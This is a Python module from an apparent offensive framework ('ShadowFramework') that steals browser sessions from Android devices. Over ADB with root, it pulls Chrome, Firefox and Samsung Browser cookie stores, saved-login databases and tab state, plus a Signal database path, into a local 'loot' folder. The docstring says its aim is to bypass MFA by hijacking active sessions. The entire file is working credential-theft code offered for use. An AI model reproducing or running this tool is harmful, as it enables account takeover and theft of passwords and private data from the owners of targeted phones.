"""
ShadowFramework — Android Browser Session Stealer
Extracts session cookies and databases from Android browsers (Chrome, Firefox, etc.)
This is a high-impact module for bypassing MFA by stealing active sessions.
"""
import os
import subprocess
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=20):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1

class Module:
    MODULE_INFO = {
        'name': 'post/android/browser_session_stealer',
        'description': 'Extracts session cookies and databases from Android browsers (Chrome, Firefox, etc.). Requires Root or ADB access.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'BROWSERS': 'Target browsers [default: chrome,firefox,samsung]',
            'OUTPUT_DIR': 'Local dir to save results [default: loot/sessions/]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _pull_data(self, dev, remote_path, local_dir):
        """Attempts to pull data, handling permission issues."""
        local_dir.mkdir(parents=True, exist_ok=True)
        # Try direct pull
        _, _, rc = _adb(dev, 'pull', remote_path, str(local_dir))
        if rc != 0:
            # Try via cat (sometimes works on /data if adb is root)
            filename = os.path.basename(remote_path)
            out, _, rc = _adb(dev, 'shell', 'su', '-c', f'cat {remote_path}', timeout=60)
            if rc == 0:
                with open(local_dir / filename, 'w') as f:
                    f.write(out)
                return True
            return False
        return True

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        browsers_str = self.framework.options.get('BROWSERS', 'chrome,firefox,samsung')
        output_base = Path(self.framework.options.get('OUTPUT_DIR', 'loot/sessions'))
        
        target_browsers = [b.strip() for b in browsers_str.split(',')]

        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        console.print(f"[cyan][*] Assessing session extraction on {device_id}...[/cyan]")
        log_action(f"Session stealer started on {device_id}")

        # Check for root (essential for /data/data access)
        res, _, _ = _adb(device_id, 'shell', 'su', '-c', 'id')
        is_root = 'uid=0' in res
        if not is_root:
            console.print("[yellow][!] Device not rooted. Extraction from /data/data may fail unless ADB is running as root.[/yellow]")

        targets = {
            'chrome': [
                '/data/data/com.android.chrome/app_chrome/Default/Cookies',
                '/data/data/com.android.chrome/app_chrome/Default/Login Data',
                '/data/data/com.android.chrome/app_chrome/Default/Web Data',
                '/data/data/com.android.chrome/app_tabs/0/tab_state'
            ],
            'firefox': [
                '/data/data/org.thoughtcrime.securesms/databases/signal.db', # Note: Placeholders for now
                '/data/data/org.mozilla.firefox/files/mozilla/*.default/cookies.sqlite',
                '/data/data/org.mozilla.firefox/files/mozilla/*.default/logins.json'
            ],
            'samsung': [
                '/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/Cookies'
            ]
        }

        extracted = 0
        for b_name in target_browsers:
            if b_name.lower() not in targets:
                continue
            
            console.print(f"\n[cyan][+] Targeting {b_name.upper()}...[/cyan]")
            b_dir = output_base / device_id / b_name
            
            for path in targets[b_name.lower()]:
                # Handle wildcards in path
                if '*' in path:
                    parent = os.path.dirname(path)
                    out, _, _ = _adb(device_id, 'shell', 'ls', parent)
                    for line in out.splitlines():
                        if 'default' in line:
                            real_path = path.replace('*', line.strip())
                            if self._pull_data(device_id, real_path, b_dir):
                                console.print(f"  [green]✓ Pulled: {os.path.basename(real_path)}[/green]")
                                extracted += 1
                else:
                    if self._pull_data(device_id, path, b_dir):
                        console.print(f"  [green]✓ Pulled: {os.path.basename(path)}[/green]")
                        extracted += 1

        if extracted > 0:
            console.print(f"\n[bold green][+] Success! {extracted} session files exfiltrated to {output_base}/{device_id}/[/bold green]")
            log_action(f"Exfiltrated {extracted} session files from {device_id}")
        else:
            console.print("\n[red][!] Failed to extract session files. Are permissions set correctly?[/red]")
            console.print("[dim]Tip: Try 'adb root' if possible or check if 'su' is available on the target.[/dim]")
